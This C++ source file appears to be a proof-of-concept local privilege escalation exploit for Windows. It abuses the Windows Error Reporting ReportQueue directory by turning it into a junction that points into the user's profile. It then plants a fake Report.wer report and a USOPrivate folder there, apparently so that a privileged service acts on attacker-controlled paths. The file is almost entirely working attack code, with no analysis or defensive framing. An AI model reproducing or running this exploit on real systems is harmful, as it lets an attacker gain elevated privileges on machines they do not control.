#include "stdafx.h"
#include "comdef.h"
#include "ReparsePoint.h"
#include <iostream>
#include "FileOpLock.h"
#include "shlobj.h"
#include "Shlwapi.h"
using namespace std;
#pragma comment(lib, "Shlwapi.lib")


LPWSTR GetProfileDirectory()
{
	LPWSTR lpRet = nullptr;

	SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &lpRet);

	

	return lpRet;
}

int _tmain()
{


	HANDLE hJunction = CreateFile(L"c:\\programdata\\microsoft\\windows\\wer\\ReportQueue", GENERIC_READ | FILE_WRITE_DATA,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		nullptr);
	
	std::wstring mywstring(GetProfileDirectory());
	std::wstring concatted_stdstr = mywstring + L"\\1";
	LPCWSTR concatted = concatted_stdstr.c_str();
	
	std::wstring concatted_stdstr22 = mywstring + L"\\2";
	LPCWSTR concatted22 = concatted_stdstr22.c_str();

	CreateDirectory(concatted22, NULL);

	CreateDirectory(concatted, NULL);
	ReparsePoint::CreateMountPoint(hJunction,concatted22, L"");
	CloseHandle(hJunction);



	std::wstring concatted_stdstr2 = mywstring + L"\\2\\1_1_1_1_2010";
	LPCWSTR concatted2 = concatted_stdstr2.c_str();
	
	CreateDirectory(concatted2, NULL);

	std::wstring concatted_stdstr3 = mywstring + L"\\2\\1_1_1_1_2010\\Report.wer";
	LPCWSTR concatted3 = concatted_stdstr3.c_str();

	LPWSTR test1 = L"Report.wer";
	
	CopyFile(test1, concatted3, FALSE);



	std::wstring concatted_stdstr5 = mywstring + L"\\2\\1_1_1_1_2010\\USOPrivate";
	LPCWSTR concatted5 = concatted_stdstr5.c_str();

	CreateDirectory(concatted5, NULL);

	return 0;
}

